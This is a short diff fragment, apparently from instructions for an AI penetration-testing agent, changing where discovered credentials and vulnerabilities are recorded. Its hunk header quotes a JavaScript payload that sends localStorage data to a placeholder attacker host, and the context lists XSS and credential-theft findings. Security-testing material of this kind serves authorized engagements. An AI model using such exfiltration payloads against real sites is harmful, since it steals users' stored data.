@@ -317,7 +317,7 @@ fetch('https://ATTACKER/?flag='+encodeURIComponent(localStorage.getItem('flag'))
 - **postMessage with no origin check**: Can be exploited cross-origin from any page
 - **DOM XSS on login page**: Credential theft via phishing overlay
 
-Update `engagement/state.md` with any new credentials, access, vulns, or pivot paths discovered.
+Report in your return summary: any new credentials, access, vulns, or pivot paths discovered.
 
 When routing, pass along: source, sink, data flow path, and working payload.
 
